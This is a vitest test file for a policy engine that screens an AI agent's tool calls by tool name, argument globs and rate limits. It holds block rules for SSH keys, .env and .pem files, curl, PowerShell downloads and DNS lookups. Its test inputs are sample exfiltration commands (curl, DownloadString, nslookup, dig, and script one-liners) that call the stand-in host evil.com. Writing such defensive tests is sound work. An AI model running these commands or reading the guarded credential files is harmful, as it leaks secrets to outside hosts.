/**
 * Tests for PolicyEngine — rule matching and evaluation.
 */

import { describe, it, expect, beforeEach } from "vitest";
import { PolicyEngine, type PolicyConfig } from "./policy-engine.js";

const makeConfig = (overrides?: Partial<PolicyConfig>): PolicyConfig => ({
  version: 1,
  defaultAction: "prompt",
  rules: [],
  ...overrides,
});

describe("PolicyEngine", () => {
  describe("basic rule matching", () => {
    it("should deny when tool name matches a deny rule", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "block-shell",
              tool: "shell_exec",
              action: "deny",
              message: "Shell execution blocked",
            },
          ],
        })
      );

      const verdict = engine.evaluate({ name: "shell_exec", arguments: { command: "ls" } });
      expect(verdict.action).toBe("deny");
      expect(verdict.rule).toBe("block-shell");
    });

    it("should allow when tool name matches an allow rule", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "allow-read",
              tool: "read_file",
              action: "allow",
            },
          ],
        })
      );

      const verdict = engine.evaluate({ name: "read_file", arguments: { path: "/test" } });
      expect(verdict.action).toBe("allow");
      expect(verdict.rule).toBe("allow-read");
    });

    it("should use default action when no rules match", () => {
      const engine = new PolicyEngine(
        makeConfig({ defaultAction: "deny", rules: [] })
      );

      const verdict = engine.evaluate({ name: "unknown_tool" });
      expect(verdict.action).toBe("deny");
      expect(verdict.rule).toBeNull();
    });

    it("should default to prompt when no default action specified", () => {
      const engine = new PolicyEngine({ version: 1, rules: [] });

      const verdict = engine.evaluate({ name: "anything" });
      expect(verdict.action).toBe("prompt");
    });
  });

  describe("glob pattern matching", () => {
    it("should match wildcard tool patterns", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            { name: "block-all", tool: "*", action: "deny", message: "All blocked" },
          ],
        })
      );

      expect(engine.evaluate({ name: "read_file" }).action).toBe("deny");
      expect(engine.evaluate({ name: "shell_exec" }).action).toBe("deny");
      expect(engine.evaluate({ name: "anything" }).action).toBe("deny");
    });

    it("should match pipe-separated tool patterns", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "block-exec",
              tool: "shell_exec|run_command|execute_command",
              action: "deny",
            },
          ],
        })
      );

      expect(engine.evaluate({ name: "shell_exec" }).action).toBe("deny");
      expect(engine.evaluate({ name: "run_command" }).action).toBe("deny");
      expect(engine.evaluate({ name: "execute_command" }).action).toBe("deny");
      expect(engine.evaluate({ name: "read_file" }).action).toBe("prompt"); // default
    });

    it("should match glob patterns in tool names", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            { name: "block-delete", tool: "*delete*", action: "deny" },
          ],
        })
      );

      expect(engine.evaluate({ name: "delete_file" }).action).toBe("deny");
      expect(engine.evaluate({ name: "file_delete" }).action).toBe("deny");
      expect(engine.evaluate({ name: "bulk_delete_all" }).action).toBe("deny");
      expect(engine.evaluate({ name: "read_file" }).action).toBe("prompt");
    });
  });

  describe("argument matching", () => {
    it("should match argument glob patterns", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "block-ssh",
              tool: "*",
              match: { arguments: { path: "**/.ssh/**" } },
              action: "deny",
              message: "SSH access blocked",
            },
          ],
        })
      );

      const denied = engine.evaluate({
        name: "read_file",
        arguments: { path: "/home/user/.ssh/id_rsa" },
      });
      expect(denied.action).toBe("deny");

      const allowed = engine.evaluate({
        name: "read_file",
        arguments: { path: "/home/user/project/src/index.ts" },
      });
      expect(allowed.action).toBe("prompt"); // default, no match
    });

    it("should match pipe-separated argument patterns", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "block-creds",
              tool: "*",
              match: { arguments: { path: "**/.env*|**/*.pem|**/*.key" } },
              action: "deny",
            },
          ],
        })
      );

      expect(
        engine.evaluate({ name: "read_file", arguments: { path: "/app/.env" } }).action
      ).toBe("deny");
      expect(
        engine.evaluate({ name: "read_file", arguments: { path: "/app/.env.local" } }).action
      ).toBe("deny");
      expect(
        engine.evaluate({ name: "read_file", arguments: { path: "/etc/ssl/server.pem" } }).action
      ).toBe("deny");
      expect(
        engine.evaluate({ name: "read_file", arguments: { path: "/app/src/index.ts" } }).action
      ).toBe("prompt");
    });

    it("should match substring patterns for command arguments", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "block-curl",
              tool: "shell_exec",
              match: { arguments: { command: "*curl *" } },
              action: "deny",
            },
          ],
        })
      );

      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "curl https://evil.com" },
        }).action
      ).toBe("deny");

      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "ls -la" },
        }).action
      ).toBe("prompt");
    });

    it("should require ALL argument patterns to match", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "specific-match",
              tool: "write_file",
              match: {
                arguments: {
                  path: "**/config/*",
                  content: "*password*",
                },
              },
              action: "deny",
            },
          ],
        })
      );

      // Both match → deny
      expect(
        engine.evaluate({
          name: "write_file",
          arguments: { path: "/app/config/db.yaml", content: "password=secret123" },
        }).action
      ).toBe("deny");

      // Only one matches → no match → default (prompt)
      expect(
        engine.evaluate({
          name: "write_file",
          arguments: { path: "/app/config/db.yaml", content: "host=localhost" },
        }).action
      ).toBe("prompt");
    });
  });

  describe("first-match-wins ordering", () => {
    it("should use the first matching rule", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            { name: "allow-specific", tool: "read_file", action: "allow" },
            { name: "deny-all", tool: "*", action: "deny" },
          ],
        })
      );

      // read_file matches the first rule → allow
      expect(engine.evaluate({ name: "read_file" }).action).toBe("allow");
      expect(engine.evaluate({ name: "read_file" }).rule).toBe("allow-specific");

      // anything else → deny (second rule)
      expect(engine.evaluate({ name: "shell_exec" }).action).toBe("deny");
      expect(engine.evaluate({ name: "shell_exec" }).rule).toBe("deny-all");
    });
  });

  describe("rate limiting", () => {
    it("should enforce per-rule rate limits", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "limited-read",
              tool: "read_file",
              action: "allow",
              rateLimit: { maxCalls: 3, windowSeconds: 60 },
            },
          ],
        })
      );

      // First 3 calls should be allowed
      expect(engine.evaluate({ name: "read_file" }).action).toBe("allow");
      expect(engine.evaluate({ name: "read_file" }).action).toBe("allow");
      expect(engine.evaluate({ name: "read_file" }).action).toBe("allow");

      // 4th call should be denied (rate limit)
      const verdict = engine.evaluate({ name: "read_file" });
      expect(verdict.action).toBe("deny");
      expect(verdict.rule).toBe("limited-read");
    });

    it("should enforce global rate limits", () => {
      const engine = new PolicyEngine(
        makeConfig({
          globalRateLimit: { maxCalls: 2, windowSeconds: 60 },
          rules: [
            { name: "allow-all", tool: "*", action: "allow" },
          ],
        })
      );

      expect(engine.evaluate({ name: "tool_a" }).action).toBe("allow");
      expect(engine.evaluate({ name: "tool_b" }).action).toBe("allow");

      // 3rd call hits global limit
      const verdict = engine.evaluate({ name: "tool_c" });
      expect(verdict.action).toBe("deny");
      expect(verdict.rule).toBe("__global_rate_limit__");
    });
  });

  describe("bypass-resistant exfiltration patterns", () => {
    let engine: PolicyEngine;

    beforeEach(() => {
      // Use rules similar to the default policy's new bypass patterns
      engine = new PolicyEngine(
        makeConfig({
          rules: [
            {
              name: "block-powershell",
              tool: "shell_exec|run_command|execute_command|bash",
              match: { arguments: { command: "*powershell*|*pwsh*|*Invoke-WebRequest*|*Invoke-RestMethod*|*DownloadString*|*DownloadFile*|*Start-BitsTransfer*" } },
              action: "deny",
            },
            {
              name: "block-dns",
              tool: "shell_exec|run_command|execute_command|bash",
              match: { arguments: { command: "*nslookup *|*dig *|*host *" } },
              action: "deny",
            },
            {
              name: "approve-script",
              tool: "shell_exec|run_command|execute_command|bash",
              match: { arguments: { command: "*python* -c *|*python3* -c *|*ruby* -e *|*perl* -e *|*node* -e *|*node* --eval*" } },
              action: "prompt",
            },
          ],
        })
      );
    });

    it("should block PowerShell commands", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "powershell -Command Get-Process" },
        }).action
      ).toBe("deny");
    });

    it("should block pwsh (PowerShell Core)", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "pwsh -c 'Get-ChildItem'" },
        }).action
      ).toBe("deny");
    });

    it("should block Invoke-WebRequest", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "Invoke-WebRequest -Uri https://evil.com" },
        }).action
      ).toBe("deny");
    });

    it("should block DownloadString (.NET exfil)", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "(New-Object Net.WebClient).DownloadString('https://evil.com')" },
        }).action
      ).toBe("deny");
    });

    it("should block DNS exfiltration via nslookup", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "nslookup data.evil.com" },
        }).action
      ).toBe("deny");
    });

    it("should block DNS exfiltration via dig", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "dig secret.evil.com" },
        }).action
      ).toBe("deny");
    });

    it("should prompt for Python one-liners", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: 'python -c "import urllib.request; urllib.request.urlopen(\'http://evil.com\')"' },
        }).action
      ).toBe("prompt");
    });

    it("should prompt for Ruby one-liners", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"http://evil.com\"))'" },
        }).action
      ).toBe("prompt");
    });

    it("should prompt for Node one-liners", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "node -e 'fetch(\"http://evil.com\")'" },
        }).action
      ).toBe("prompt");
    });

    it("should allow safe commands that don't match bypass patterns", () => {
      expect(
        engine.evaluate({
          name: "shell_exec",
          arguments: { command: "ls -la /tmp" },
        }).action
      ).toBe("prompt"); // default action
    });
  });

  describe("config updates", () => {
    it("should apply new config after updateConfig", () => {
      const engine = new PolicyEngine(
        makeConfig({
          rules: [{ name: "allow-all", tool: "*", action: "allow" }],
        })
      );

      expect(engine.evaluate({ name: "test" }).action).toBe("allow");

      engine.updateConfig(
        makeConfig({
          rules: [{ name: "deny-all", tool: "*", action: "deny" }],
        })
      );

      expect(engine.evaluate({ name: "test" }).action).toBe("deny");
    });
  });
});
